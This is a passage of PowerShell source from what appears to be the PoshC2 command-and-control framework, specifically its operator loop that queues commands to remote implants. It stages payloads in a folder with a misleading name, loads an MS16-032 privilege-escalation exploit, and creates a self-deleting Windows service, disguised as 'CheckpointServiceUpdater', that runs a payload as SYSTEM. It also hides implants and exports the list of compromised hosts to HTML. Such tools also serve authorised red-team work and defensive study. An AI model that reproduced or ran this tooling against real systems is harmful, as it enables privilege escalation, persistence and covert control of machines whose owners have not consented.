                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "new-item -path c:\programdata\ -name msofficepro98 -Type Directory"
                } | Out-Null
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = '$payload | out-file c:\programdata\msofficepro98\registry.dat'
                } | Out-Null
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "LoadModule invoke-ms16-032.ps1"
                } | Out-Null
                $pscommand = "start-sleep 15; remove-item c:\programdata\msofficepro98 -recurse"
            }
            if ($pscommand -eq 'invoke-ms16-032-proxypayload')
            { 
                if (Test-Path "$FolderPath\proxypayload.bat"){ 
                $proxypayload = Get-Content -Path "$FolderPath\proxypayload.bat"               
                CheckModuleLoaded "Invoke-MS16-032.ps1" $psrandomuri
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "new-item -path c:\programdata\ -name msofficepro98 -Type Directory"
                } | Out-Null
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "'$proxypayload' | out-file c:\programdata\msofficepro98\registry.dat"
                } | Out-Null
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   =  "LoadModule invoke-ms16-032.ps1"
                } | Out-Null

                $pscommand = "start-sleep 15; remove-item c:\programdata\msofficepro98 -recurse"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = 'fvdsghfdsyyh'
                }
            }
            # write-host " Get-System | Get-System-WithProxy" -ForegroundColor Green 
            if ($pscommand -eq 'Get-System') 
            {
                $payload = Get-Content -Path "$FolderPath\payload.bat"
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"

                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                } | Out-Null

                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"

                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "sc.exe start CPUpdater"
                } | Out-Null
                $pscommand = "sc.exe delete CPUpdater"

            }
            if ($pscommand -eq 'Get-System-WithProxy') 
            {
                if (Test-Path "$FolderPath\proxypayload.bat"){
                    $payload = Get-Content -Path "$FolderPath\proxypayload.bat"

                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $psrandomuri
                        Command   = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                    } | Out-Null

                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $psrandomuri
                        Command   = "sc.exe start CPUpdater"
                    } | Out-Null
                    $pscommand = "sc.exe delete CPUpdater"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = 'fvdsghfdsyyh'
                }
            }                   
            if ($pscommand -eq 'Hide-Implant') 
            {
                $pscommand = "Hide"
            }
            if ($pscommand -eq 'Unhide-Implant' ) {
               Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='Yes' WHERE RandomURI='$psrandomuri'" | Out-Null
            }
            if ($pscommand -eq 'output-to-html' ) {
               $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants" -As PSObject
               $ImplantsArray = @()
               foreach ($implantres in $allresults) {                  
                    $ImplantLog = New-Object PSObject | Select ImplantID, RandomURI, User, Hostname, IPAddress, FirstSeen, LastSeen, PID, Arch, Domain, Sleep
		            $ImplantLog.ImplantID = $implantres.ImplantID;
		            $ImplantLog.RandomURI = $implantres.RandomURI;
		            $ImplantLog.User = $implantres.User;
		            $ImplantLog.Hostname = $implantres.Hostname;
		            $ImplantLog.IPAddress = $implantres.IPAddress;
		            $ImplantLog.FirstSeen = $implantres.FirstSeen;
		            $ImplantLog.LastSeen = $implantres.LastSeen;
                    $ImplantLog.PID = $implantres.PID;
                    $ImplantLog.Arch = $implantres.Arch;
                    $ImplantLog.Domain = $implantres.Domain;
                    $ImplantLog.Sleep = $implantres.Sleep;
                    $ImplantsArray += $ImplantLog
               }
               #$ImplantsArray | ConvertTo-HTML -Property ImplantID, RandomURI, User, Hostname, IPAddress, FirstSeen, LastSeen, PID, Arch, Domain, Sleep | Out-File "$FolderPath\Implants.html"

               $ImplantsArray | ConvertTo-Html -title "<title>Implant List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\Implants.html"

               $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks" -As PSObject
               $TasksArray = @()
               foreach ($task in $allresults) {                  
                    $ImplantTask = New-Object PSObject | Select TaskID, Timestamp, RandomURI, Command, Output
		            $ImplantTask.TaskID = $task.CompletedTaskID;
                    $ImplantTask.Timestamp = $task.TaskID;
		            $ImplantTask.RandomURI = $task.RandomURI;
                    $ImplantTask.Command = $task.Command;
                    $ImplantTask.Output = $task.Output;
                    $TasksArray += $ImplantTask
               }
               $TasksArray | ConvertTo-Html -title "<title>Tasks from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\ImplantTasks.html"
               $pscommand = 'fvdsghfdsyyh'
            }
            $pscommand
}
# command process loop
while($true)
{
    $global:command = Read-Host -Prompt $global:cmdlineinput

    if ($global:command)
    {          
        if ($global:implantid -eq "ALL")
        {
            if ($global:command -eq 'back' -or $global:command -eq 'exit') 
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            else 
            {
                $dbresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE Alive='Yes'" -As SingleValue
                foreach ($implanturisingular in $dbresults)
                {
                    $global:randomuri = $implanturisingular
                    $outputcmd = runcommand $global:command $global:randomuri 
                    if (($outputcmd -eq 'exit' ) -or ($outputcmd -eq 'hide' )) 
                    {
                        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$implanturisingular'"|Out-Null
                    }
                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $implanturisingular
                        Command   = $outputcmd
                    } | Out-Null
                }
            }
        }
        elseif ($global:implantid.contains(",")){
            if ($global:command -eq 'back' -or $global:command -eq 'exit')
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            else 
            {
                $global:implantid.split(",")| foreach {
                    $global:randomuri = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE ImplantID='$_'" -as SingleValue
                    $outputcmd = runcommand $global:command $global:randomuri
                    if (($global:command -eq 'exit' ) -or ($outputcmd -eq 'hide' )) 
                    {
                        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$global:randomuri'"|Out-Null
                    }
                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $global:randomuri
                        Command   = $outputcmd
                    } | Out-Null
                }
            }            
        }
        else 
        {
            if ($global:command -eq 'back' -or $global:command -eq 'exit') 
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            else 
            {
                #write-host $global:command $global:randomuri
                $outputcmd = runcommand $global:command $global:randomuri
                if ($outputcmd -eq 'hide' ) 
                {
                    Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$global:randomuri'"|Out-Null
                }
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"

                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $global:randomuri
                    Command   = $outputcmd
                } | Out-Null
            }
        }
    }
}
}


